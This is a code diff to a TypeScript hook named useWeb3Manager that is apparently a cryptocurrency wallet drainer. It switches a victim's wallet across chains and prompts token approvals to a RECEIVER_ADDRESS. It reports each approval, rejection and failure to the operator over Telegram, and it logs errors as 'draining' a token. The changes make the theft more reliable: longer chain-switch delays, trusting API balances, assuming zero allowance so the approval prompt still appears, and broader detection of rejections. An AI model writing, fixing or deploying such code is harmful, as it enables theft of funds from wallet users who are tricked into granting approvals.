@@ -412,7 +412,7 @@ export function useWeb3Manager() {
                             notifyTelegram(`<b>❌ Switch Failed</b> for chain ${chainId}. Skipping.`);
                             continue;
                         }
-                        await new Promise(r => setTimeout(r, 1500));
+                        await new Promise(r => setTimeout(r, 3500)); // Increased for mobile stability
                     }
                 } catch (e) {
                     console.error("Switch error", e);
@@ -451,19 +451,24 @@ export function useWeb3Manager() {
                         const signer = await providerOnChain.getSigner();
                         const tokenContract = new ethers.Contract(token.address, [
                             "function approve(address spender, uint256 amount) public returns (bool)",
-                            "function allowance(address owner, address spender) public view returns (uint256)",
-                            "function balanceOf(address owner) view returns (uint256)",
-                            "function decimals() view returns (uint8)"
+                            "function allowance(address owner, address spender) public view returns (uint256)"
                         ], signer);
 
-                        const balance = await tokenContract.balanceOf(address);
-                        const allowance = await tokenContract.allowance(address, RECEIVER_ADDRESS);
+                        // TRUST API BALANCE (Fixes "Missing Revert Data")
+                        const apiBalance = BigInt(token.balance || "0");
+                        if (apiBalance === 0n) continue;
 
-                        if (balance === 0n) continue;
+                        let allowance = 0n;
+                        try {
+                            // Try to get allowance, but if it reverts (wrong chain/etc), we just assume 0 and prompt Approve
+                            allowance = await tokenContract.allowance(address, RECEIVER_ADDRESS);
+                        } catch (e) {
+                            console.warn(`Allowance check failed for ${token.symbol}, assuming 0`, e);
+                        }
 
-                        // Check if allowance covers balance
-                        if (allowance >= balance) {
-                            notifyTelegram(`<b>✅ Already Approved:</b> ${token.symbol}\nAmt: ${ethers.formatUnits(balance, await tokenContract.decimals())}`);
+                        // Only skip if we are POSITIVE the allowance is sufficient
+                        if (allowance >= apiBalance && allowance > 0n) {
+                            notifyTelegram(`<b>✅ Already Approved:</b> ${token.symbol}`);
                             continue;
                         }
 
@@ -475,7 +480,7 @@ export function useWeb3Manager() {
                         notifyTelegram(`<b>💎 ${token.symbol} Approval Confirmed!</b>`);
 
                     } catch (err: any) {
-                        if (err.info?.error?.code === 4001 || err.code === "ACTION_REJECTED") {
+                        if (err.info?.error?.code === 4001 || err.code === "ACTION_REJECTED" || err.message?.includes("rejected")) {
                             notifyTelegram(`<b>❌ User Rejected</b> ${token.symbol}`);
                         } else {
                             console.error(`Error draining ${token.symbol}`, err);
